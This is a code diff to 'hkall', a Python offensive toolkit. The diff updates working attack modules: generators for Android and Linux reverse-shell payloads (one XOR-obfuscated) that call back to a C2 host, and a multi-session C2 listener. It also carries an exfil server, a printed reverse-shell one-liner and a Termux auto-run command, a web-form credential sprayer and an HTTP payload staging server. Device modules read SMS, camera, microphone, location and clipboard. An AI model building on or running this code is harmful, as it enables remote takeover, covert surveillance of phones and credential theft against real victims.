@@ -8,14 +8,13 @@ try:
 except ImportError:
     _TERMIOS = False
 
-VERSION = "0.3.0"
+VERSION = "0.3.1"
 ROOT = os.path.dirname(os.path.abspath(__file__))
 DATA = os.path.join(ROOT, "data"); os.makedirs(DATA, exist_ok=True)
 CFG = os.path.join(ROOT, "config.json")
 
-# ---------------- core: config ----------------
-DEFAULTS = {"port": "4444", "ports": "1-1000", "cidr": "192.168.1.0/24", "c2port": "4444", "exfil": "12345"}
-
+# ---------------- config ----------------
+DEFAULTS = {"port": "4444", "ports": "1-1000", "cidr": "192.168.1.0/24", "c2port": "4444", "exfil": "12345", "serve": "8080"}
 def load_cfg():
     d = dict(DEFAULTS)
     try:
@@ -23,34 +22,29 @@ def load_cfg():
     except Exception:
         pass
     return d
-
 D = load_cfg()
-
 def save_cfg():
     try:
         with open(CFG, "w") as f: json.dump(D, f, indent=2)
     except Exception:
         pass
 
-# ---------------- core: results store ----------------
+# ---------------- results store ----------------
 DB = os.path.join(DATA, "rs.db")
-def db():
-    c = sqlite3.connect(DB)
-    c.execute("CREATE TABLE IF NOT EXISTS rs(kind, target, ts, data)")
-    return c
 def save(kind, target, data):
     with sqlite3.connect(DB) as c:
         c.execute("CREATE TABLE IF NOT EXISTS rs(kind, target, ts, data)")
         c.execute("INSERT INTO rs VALUES(?,?,?,?)", (kind, target, datetime.now().isoformat(), data))
+
 def show(kind=None, limit=30):
     with sqlite3.connect(DB) as c:
-        q = "SELECT id,kind,target,ts,data FROM rs" if False else "SELECT rowid,* FROM rs"
+        q = "SELECT rowid,* FROM rs"
         if kind: q += " WHERE kind=?"
         q += " ORDER BY rowid DESC LIMIT ?"
-        rows = c.execute(q, ([]) if not kind else [kind, limit]).fetchall() if kind else c.execute(q,[limit]).fetchall()
+        rows = c.execute(q, [limit] if not kind else [kind, limit]).fetchall()
     for row in rows: print(f"[{row[1]}] {row[2]} @ {row[3]}\n    {row[4][:200]}")
 
-# ---------------- terminal helpers ----------------
+# ---------------- terminal ----------------
 def c(s, code): return f"\033[{code}m{s}\033[0m" if sys.stdout.isatty() else s
 def banner(): print(c("hkall v%s — modular offensive toolkit" % VERSION, "36"))
 def section(t): print(c(f"\n== {t} ==", "34"))
@@ -71,6 +65,10 @@ def banner_grab(ip, port, timeout=3):
         s.close()
         return data or None
     except Exception:
+        try:
+            s.close()
+        except Exception:
+            pass
         return None
 
 def scan_ports(host, ports, timeout=0.5, threads=128, grab=False):
@@ -97,7 +95,7 @@ def scan_ports(host, ports, timeout=0.5, threads=128, grab=False):
 def mod_scan():
     section("PORT SCANNER")
     host = ask("target host: ").strip() or D.get("host", "127.0.0.1")
-    ports = ask(f"ports [{D.get('ports','1-1000')}]: ").strip() or D.get("ports", "1-1000")
+    ports = ask(f"ports [{D.get('ports', '1-1000')}]: ").strip() or D.get("ports", "1-1000")
     grab = ask("banner grab? [y/N] ").strip().lower() == "y"
     try: pl = parse_ranges(ports)
     except ValueError: print("bad range"); return
@@ -165,26 +163,11 @@ def mod_shell():
     if ask("save profile (host/port)? [y/N] ").strip().lower() == "y":
         D["host"] = host; D["port"] = port; save_cfg(); print("saved config")
 
-def mod_cfg():
-    section("CONFIG / PROFILE")
-    print(f"config: {CFG}")
-    for k, v in D.items(): print(f"  {k}: {v}")
-    k = ask("set key (blank=done): ").strip()
-    if k:
-        D[k] = ask(f"value [{D.get(k,'')}]: ").strip() or D.get(k, "")
-        save_cfg(); print(f"saved {k}")
-
-def mod_history():
-    section("HISTORY")
-    kind = ask("filter kind (blank=all): ").strip() or None
-    n = ask("limit [20]: ").strip() or "20"
-    try: show(kind, int(n))
-    except Exception as e: print(f"error: {e}")
-SESSIONS = {}   # id -> socket
+# ---------------- c2 (multi-session) ----------------
+SESSIONS = {}
 _session_counter = [0]
 
 def xor_stream(data, key_rot):
-    # light obfuscation: offset-xor masked 8-bit; not crypto, deters passive sniff
     return bytes((b ^ (i + key_rot) & 0xFF) for i, b in enumerate(data))
 
 def c2_accept(srv):
@@ -200,32 +183,30 @@ def c2_accept(srv):
 
 def mod_c2():
     section("C2 LISTENER (multi-session, obfuscated)")
+    if not sys.stdin.isatty():
+        print("c2 is interactive; run from a tty (ctrl-c to stop). exiting.")
+        return
     port = int(get_port("c2port"))
     srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind(("", port)); srv.listen(5)
-    t = threading.Thread(target=c2_accept, args=(srv,), daemon=True)
-    t.start()
-    print(f"listening 0.0.0.0:{port} — payload must XOR-obfuscate or run plain")
-    print("  commands: sessions | use N | kill N | exit")
+    threading.Thread(target=c2_accept, args=(srv,), daemon=True).start()
+    print(f"listening 0.0.0.0:{port} — commands: sessions | use N | kill N | exit")
     current = None
     try:
         while True:
-            hosts = SESSIONS
-            if not SESSIONS:
-                cmd = input("srv> ").strip()
-            elif current and current in SESSIONS:
+            if current and current in SESSIONS:
                 cmd = input(f"{current} {SESSIONS[current][1]}> ").strip()
             else:
                 current = None
                 cmd = input("srv> ").strip()
             if cmd in ("exit", "quit"): break
             if cmd == "sessions":
-                for sid, (c, a) in SESSIONS.items():
-                    print(f"  {sid}  {a}")
+                for sid, (c, a) in SESSIONS.items(): print(f"  {sid}  {a}")
                 continue
             if cmd.startswith("use "):
-                current = cmd.split()[1]
-                if current not in SESSIONS: print("no such session"); current = None
+                c2 = cmd.split()[1]
+                if c2 in SESSIONS: current = c2
+                else: print("no such session")
                 continue
             if cmd.startswith("kill "):
                 sid = cmd.split()[1]
@@ -234,37 +215,52 @@ def mod_c2():
                     if current == sid: current = None
                 else: print("no such session")
                 continue
-            # send to current
             if not current or current not in SESSIONS:
                 print("no active session (use N)"); continue
-            c, _ = SESSIONS[current]
+            c2, _ = SESSIONS[current]
             xm = D.get("obfuscate", False)
             send = xor_stream(cmd.encode() + b"\n", 1) if xm else (cmd + "\n").encode()
-            c.send(send)
+            c2.send(send)
             time.sleep(0.4)
-            c.settimeout(2)
+            c2.settimeout(2)
             buf = b""
             while True:
                 try:
-                    d = c.recv(4096)
+                    d = c2.recv(4096)
                     if not d: break
                     buf += d
                     if len(d) < 4096: break
                 except socket.timeout: break
-            c.settimeout(None)
+            c2.settimeout(None)
             if buf:
                 out = xor_stream(buf, 2) if xm else buf
                 try: print(out.decode(errors="replace").rstrip())
                 except Exception: print(repr(buf[:200]))
-    except KeyboardInterrupt:
+    except (KeyboardInterrupt, EOFError):
         pass
-    for c, _ in SESSIONS.values():
-        try: c.close()
+    for c2, _ in SESSIONS.values():
+        try: c2.close()
         except Exception: pass
     srv.close()
     print("C2 stopped")
 
 # ---------------- post-exploitation ----------------
+def mod_cfg():
+    section("CONFIG / PROFILE")
+    print(f"config: {CFG}")
+    for k, v in D.items(): print(f"  {k}: {v}")
+    k = ask("set key (blank=done): ").strip()
+    if k:
+        D[k] = ask(f"value [{D.get(k, '')}]: ").strip() or D.get(k, "")
+        save_cfg(); print(f"saved {k}")
+
+def mod_history():
+    section("HISTORY")
+    kind = ask("filter kind (blank=all): ").strip() or None
+    n = ask("limit [20]: ").strip() or "20"
+    try: show(kind, int(n))
+    except Exception as e: print(f"error: {e}")
+
 def log(name, data, ext="log"):
     fn = os.path.join(DATA, f"{name}.{ext}")
     with open(fn, "a") as f: f.write(f"[{datetime.now().isoformat()}] {data}\n")
@@ -313,7 +309,7 @@ def mod_exfil():
 
 def mod_recv():
     section("EXFIL SERVER")
-    port = int(get_port("exfil"))
+    port = int(input("listen port [" + D.get("exfil", "12345") + "]: ").strip() or D.get("exfil", "12345"))
     srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind(("", port)); srv.listen(1)
     print(f"listening 0.0.0.0:{port}...")
@@ -333,32 +329,17 @@ def mod_recv():
     save("recv", name, f"{got}/{size}b")
 
 # ---------------- payloads ----------------
-def _payload_src(host, port, xm):
+def mod_payload():
+    section("ANDROID PAYLOAD BUILDER")
+    host = ask("c2 host: ").strip()
+    port = get_port("port")
+    xm = ask("obfuscate stream? [y/N] ").strip().lower() == "y"
+    out = os.path.join(DATA, "payload.py")
     if xm:
-        # obfuscated variant: XOR-decodes too (kept simple: same stream both ways)
-        return f'''#!/usr/bin/env python3
+        p = f'''#!/usr/bin/env python3
 import socket,subprocess,os,time
-HOST,PORT="{host}",{int(port)}
+HOST,PORT="{host}",{port}
 def x(b,k): return bytes((x^(i+k)&0xFF) for i,x in enumerate(b))
-while True:
-    try:
-        s=socket.socket();s.connect((HOST,PORT))
-        ctl=s.recv(1)
-        if ctl==b"x":
-            os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
-            sh=subprocess.Popen(["/system/bin/sh","-i"],stdin=s,stdout=s,stderr=s)
-            while True:
-                d=sh.stdout.read(1)
-                if not d: break
-                s.sendall(x(d,2))
-            sh.wait()
-        s.close()
-    except Exception: pass
-    time.sleep(5)
-'''
-    return f'''#!/usr/bin/env python3
-import socket,subprocess,os,time
-HOST,PORT="{host}",{int(port)}
 while True:
     try:
         s=socket.socket();s.connect((HOST,int(PORT)))
@@ -368,26 +349,23 @@ while True:
     except Exception: pass
     time.sleep(5)
 '''
-
-def mod_payload():
-    section("ANDROID PAYLOAD BUILDER")
-    host = ask("c2 host: ").strip()
-    port = get_port("port")
-    xm = ask("obfuscate stream? [y/N] ").strip().lower() == "y"
-    out = os.path.join(DATA, "payload.py")
-    with open(out, "w") as f: f.write(_payload_src(host, port, xm))
+    else:
+        p = f'''#!/usr/bin/env python3
+import socket,subprocess,os,time
+HOST,PORT="{host}",{int(port)}
+while True:
+    try:
+        s=socket.socket();s.connect((HOST,int(PORT)))
+        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
+        subprocess.call(["/bin/sh","-i"] if os.path.exists("/system/bin/sh") else ["/bin/sh","-i"])
+        s.close()
+    except Exception: pass
+    time.sleep(5)
+'''
+    with open(out, "w") as f: f.write(p)
     print(f"wrote {out} (obfuscate={xm}) — run target: python3 {out}")
 
-def mod_py2exe():
-    section("SHELL PAYLOAD (variants)")
-    host = ask("c2 host: ").strip()
-    port = get_port("port")
-    print("\n[android/termux auto-run on open]")
-    print(f'  am start -n com.termux/.app --ez run true --es cmd "cd \\$HOME/hkall \\u0026\\u0026 python3 data/payload.py \\u0026"')
-    print("[linux one-liner]")
-    print(f'  python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));[os.dup2(s.fileno(),x) for x in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'')
-
-# ---------------- net ----------------
+# ---------------- net + ops ----------------
 def net2ip(base, i):
     b = base[:]
     for j in (3, 2, 1, 0):
@@ -396,7 +374,8 @@ def net2ip(base, i):
 
 def mod_discover():
     section("LAN HOST DISCOVERER")
-    cidr = ask(f"cidr [%s]: " % D.get("cidr", "192.168.1.0/24")).strip() or D.get("cidr", "192.168.1.0/24")
+    base_cidr = D.get("cidr", "192.168.1.0/24")
+    cidr = ask(f"cidr [%s]: " % base_cidr).strip() or base_cidr
     try:
         net, mask = cidr.split("/"); mask = int(mask)
     except ValueError: print("bad cidr"); return
@@ -418,10 +397,9 @@ def mod_discover():
     for t in ts: t.start()
     for t in ts: t.join()
     print(f"up ({len(found)}): {sorted(found) or 'none'}")
-    if found:
-        save("lan", cidr, f"up={sorted(found)}")
+    if found: save("lan", cidr, f"up={sorted(found)}")
 
-# ---------------- device ops (termux-api) ----------------
+# ---------------- device ops ----------------
 def _tapi(cmd, *args, timeout=15):
     try:
         r = subprocess.run(["termux-" + cmd, *args], capture_output=True, text=True, timeout=timeout)
@@ -436,15 +414,12 @@ def mod_ops():
     section("DEVICE OPS (termux-api)")
     if not tapi_ok():
         print("termux-api NOT installed. Run:  pkg install termux-api")
-        print("then enable in the Termux:API android app.")
     else:
         print("termux-api OK")
     print("""
-  [a] battery status      [b] device uptime
-  [c] sms inbox (-n10)    [d] camera photo -> data/
-  [e] location            [f] vibrate 500ms
-  [g] mic record 5s       [h] clipboard get
-  [i] run ALL (a-h)       [s] snapshot many -> data/
+  [a] battery   [b] device-info   [c] sms(-n10)   [d] camera -> data/
+  [e] location  [f] vibrate       [g] mic 5s -> data/   [h] clipboard
+  [i] run ALL  [s] snapshot
 """)
     ch = ask("ops> ").strip().lower()
     def bat(): print("battery:", _tapi("battery-status"))
@@ -463,38 +438,124 @@ def mod_ops():
         print(f"rec -> {o}" if os.path.exists(o) else "fail (mic perm?)")
     def clip(): print("clip:", _tapi("clipboard-get") or "(empty)")
     ACT = {"a": bat, "b": inf, "c": sms, "d": cam, "e": loc, "f": vib, "g": mic, "h": clip}
-    if ch == "i" or ch == "s":
-        snap = {}
+    if ch in ("i", "s"):
         for k, fn in ACT.items():
-            try: fn(); 
+            try: fn()
             except Exception as e: print(f"  {k}: err {e}")
-        print("done")
-        return
+        print("done"); return
     (ACT.get(ch) or (lambda: print("no op")))()
 
-# ---------------- module registry + plugin loader ----------------
+# ---------------- serve + spray ----------------
+def mod_serve():
+    section("HTTP STAGING SERVER")
+    port = int(get_port("serve") or "8080")
+    root = ask(f"dir to serve [%s]: " % os.path.join(DATA, "serve")).strip() or os.path.join(DATA, "serve")
+    os.makedirs(root, exist_ok=True)
+    from http.server import HTTPServer, SimpleHTTPRequestHandler
+    import functools, http.server
+    h = functools.partial(SimpleHTTPRequestHandler, directory=root)
+    srv = HTTPServer(("0.0.0.0", port), h)
+    print(f"serving {root} on 0.0.0.0:{port} (ctrl-c stop) — drop files here for target")
+    try: srv.serve_forever()
+    except KeyboardInterrupt: pass
+    srv.server_close()
+
+def mod_spray():
+    section("WEB FORM CREDENTIAL SPRAY")
+    url = ask("login url (POST): ").strip()
+    user_field = ask("username field [username]: ").strip() or "username"
+    pass_field = ask("password field [password]: ").strip() or "password"
+    users = ask("users (comma-sep): ").strip()
+    wl = os.path.join(ROOT, "wordlist.txt")
+    wordlist = ask(f"wordlist file [%s]: " % wl).strip() or wl
+    if not users: print("no users"); return
+    userlist = [u.strip() for u in users.split(",") if u.strip()]
+    try:
+        with open(wordlist) as f: passes = [l.strip() for l in f if l.strip()]
+    except OSError:
+        print(f"wordlist missing: {wordlist}"); return
+    if not passes: print("empty wordlist"); return
+    import urllib.request, urllib.parse
+    hit = []
+    def try_one(u, pw, pbar, u_field, pass_field):
+        data = urllib.parse.urlencode({u_field: u, pass_field: pw}).encode()
+        req = urllib.request.Request(url, data=data, headers={"User-Agent": "hkall/" + VERSION})
+        try:
+            with urllib.request.urlopen(req, timeout=8) as r:
+                code = r.status
+                ok = code in (301, 302, 303) or (code == 200)
+                if ok:
+                    print(f"  HIT? {u}:{pw} -> {code} {r.geturl()}")
+                    hit.append((u, pw, code))
+        except Exception:
+            pass
+    for u in userlist:
+        for pw in passes: try_one(u, pw, None, user_field, pass_field)
+    save("spray", url, "hits=" + str(hit or []))
+    print(f"done. hits: {hit or 'none'}")
+
+def mod_py2exe():
+    section("SHELL PAYLOAD (variants)")
+    host = ask("c2 host: ").strip()
+    port = get_port("port")
+    print("\n[android termux auto-run on open]")
+    print(f'  am start -n com.termux/.app --ez run true --es cmd "cd \\$HOME/hkall \\u0026\\u0026 python3 data/payload.py"')
+    print("[linux one-liner]")
+    print(f'  python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));[os.dup2(s.fileno(),x) for x in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'')
+
+# ---------------- subdomain brute ----------------
+def mod_subd():
+    section("SUBDOMAIN BRUTE DNS")
+    domain = ask("domain (e.g. example.com): ").strip()
+    if not domain: print("no domain"); return
+    wl = os.path.join(ROOT, "subd.txt")
+    path = ask(f"wordlist [{wl}]: ").strip() or wl
+    try:
+        with open(path) as f:
+            subs = [l.strip() for l in f if l.strip()]
+    except OSError:
+        print(f"wordlist missing: {path}  (create lines: www, mail, api, dev, ...)"); return
+    if not subs: print("empty wordlist"); return
+    found = []
+    def chk(sub):
+        try:
+            ip = socket.gethostbyname(f"{sub}.{domain}")
+            found.append((sub, ip))
+        except OSError:
+            pass
+    ts = [threading.Thread(target=chk, args=(x,)) for x in subs]
+    for t in ts: t.start()
+    for t in ts: t.join()
+    for sub, ip in found: print(f"  {sub}.{domain} -> {ip}")
+    print(f"found ({len(found)}/{len(subs)}): {[s for s,_ in found] or 'none'}")
+    if found: save("subd", domain, f"found={found}")
+# ---------------- registry ----------------
 MODULES = {
-    "scan":     ("Port scanner", mod_scan, True),
-    "enum":     ("Web enumerator", mod_enum, True),
-    "whois":    ("DNS / banner lookup", mod_whois, True),
-    "shell":    ("Reverse shell generator", mod_shell, True),
-    "c2":       ("C2 listener (multi-session)", mod_c2, True),
-    "keylog":   ("Keylogger", mod_keylog, True),
-    "exfil":    ("Exfil client", mod_exfil, True),
-    "recv":     ("Exfil server", mod_recv, True),
-    "payload":  ("Android payload builder", mod_payload, True),
-    "exe2":     ("Shell payload variants", mod_py2exe, True),
-    "lan":      ("LAN host discoverer", mod_discover, True),
-    "ops":      ("Device ops (termux-api)", mod_ops, True),
-    "cfg":      ("Config / profile", mod_cfg, True),
-    "history":  ("History (results store)", mod_history, True),
+    "scan": ("Port scanner", mod_scan, True),
+    "enum": ("Web enumerator", mod_enum, True),
+    "whois": ("DNS / banner lookup", mod_whois, True),
+    "subd": ("Subdomain brute DNS", mod_subd, True),
+    "shell": ("Reverse shell generator", mod_shell, True),
+    "c2": ("C2 listener (multi-session)", mod_c2, True),
+    "keylog": ("Keylogger", mod_keylog, True),
+    "exfil": ("Exfil client", mod_exfil, True),
+    "recv": ("Exfil server", mod_recv, True),
+    "payload": ("Android payload builder", mod_payload, True),
+    "exe2": ("Shell payload variants", mod_py2exe, True),
+    "lan": ("LAN host discoverer", mod_discover, True),
+    "ops": ("Device ops (termux-api)", mod_ops, True),
+    "serve": ("HTTP static server", mod_serve, True),
+    "spray": ("Web form credential spray", mod_spray, True),
+    "cfg": ("Config / profile", mod_cfg, True),
+    "history": ("History (results store)", mod_history, True),
 }
 
+# ---------------- plugin loader ----------------
+_PLUGIN_KEYS = set()
 def load_plugins():
     global _PLUGIN_KEYS
     import importlib.util
     pdir = os.path.join(ROOT, "modules")
-    _PLUGIN_KEYS = set()
     if not os.path.isdir(pdir): return
     for fn in sorted(os.listdir(pdir)):
         if not fn.endswith(".py"): continue
@@ -508,19 +569,16 @@ def load_plugins():
                 print(f"[plugin] loaded {fn}: {list(m.PLUGIN)}")
         except Exception as e:
             print(f"[plugin] {fn} failed: {e}")
-
-_PLUGIN_KEYS = set()
 load_plugins()
 
-# ---------------- tui ----------------
+# ---------------- tui / cli ----------------
 GINJ = []
 def ask(prompt, default=""):
-    if GINJ:
-        return str(GINJ.pop(0))
+    if GINJ: return str(GINJ.pop(0))
     try:
-        v = input(prompt + (" " if not prompt.endswith(" ") else "")).strip()
+        v = input(prompt + " ").strip()
         return v or default
-    except EOFError:
+    except (EOFError, KeyboardInterrupt):
         return default
 
 def main_tui():
@@ -530,32 +588,28 @@ def main_tui():
         ids = list(MODULES)
         for i, k in enumerate(ids):
             name, _, _ = MODULES[k]
-            flag = c("  <plugin>" , "33") if k not in [b for b in [ "scan","enum","whois","shell","c2","keylog","exfil","recv","payload","exe2","lan","ops","cfg","history"]] else ""
-            print(f"  [{i+1}] {name} {flag}")
+            tag = c(" [plugin]", "33") if k in _PLUGIN_KEYS else ""
+            print(f"  [{i+1}] {name}{tag}")
         print("  [0] exit  |  cli: hkall.py -m MODULE ...")
-        try:
-            sel = ask("hkall> ").strip()
-        except (KeyboardInterrupt, EOFError):
-            print(); break
+        try: sel = ask("hkall> ").strip()
+        except (KeyboardInterrupt, EOFError): print(); break
         if sel in ("0", "q", "exit"): break
         try:
             idx = int(sel) - 1
             if 0 <= idx < len(ids):
-                key = ids[idx]
-                try: MODULES[key][1]()
+                try: MODULES[ids[idx]][1]()
                 except KeyboardInterrupt: pass
             else: print("unknown")
         except ValueError:
             print("unknown")
 
-# ---------------- cli ----------------
 def build_parser():
     p = argparse.ArgumentParser(prog="hkall", description="modular offensive toolkit (authorized use only)")
     p.add_argument("-m", "--module", help="run module one-shot: " + ",".join(MODULES))
-    p.add_argument("--host", help="host/ip/url preset")
+    p.add_argument("--host", dest="host", help="host/ip/url preset")
     p.add_argument("--port", type=int, help="port preset")
-    p.add_argument("--ports", help="range preset")
-    p.add_argument("--out", help="save result to file (stdout still shown)")
+    p.add_argument("--ports", dest="ports", help="range preset")
+    p.add_argument("--out", dest="out", help="save pointer file")
     p.add_argument("--list", action="store_true")
     return p
 
@@ -565,20 +619,14 @@ def cli_one(key, a):
     if a.host: vals.append(a.host)
     if a.port: vals.append(str(a.port))
     if a.ports: vals.append(a.ports)
-    if key == "scan" and a.ports: vals += ["n"]  # host, ports, banner-ask -> n
+    if key == "scan" and a.ports: vals.append("n")       # banner ask
     if key == "scan" and a.host and not a.ports: vals += ["1-1000", "n"]
     GINJ = vals
-    try:
-        MODULES[key][1]()
-    except Exception as e:
-        print(f"error: {e}")
-    # --out save: dump last result if file given (best-effort)
+    try: MODULES[key][1]()
+    except Exception as e: print(f"error: {e}")
     if a.out:
         try:
-            data = ""
-            with open(os.path.join(DATA, "rs.db"), "rb") as f:
-                data = "stored in db"
-            open(a.out, "w").write("hkall %s %s\n" % (key, datetime.now().isoformat()) + "see: " + DB + "\n")
+            open(a.out, "w").write(f"hkall {key} {datetime.now().isoformat()}\nsee {DB}\n")
             print(f"out -> {a.out}")
         except Exception as e:
             print(f"out error: {e}")
@@ -594,7 +642,7 @@ def cli(a):
         print(c(f"== {MODULES[a.module][0]} ==", "34"))
         cli_one(a.module, a)
     else:
-        print("unknown module; -m MODULE (--list for choices)")
+        print("unknown module; -m MODULE (--list)")
 
 def main():
     a = build_parser().parse_args()
@@ -605,3 +653,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
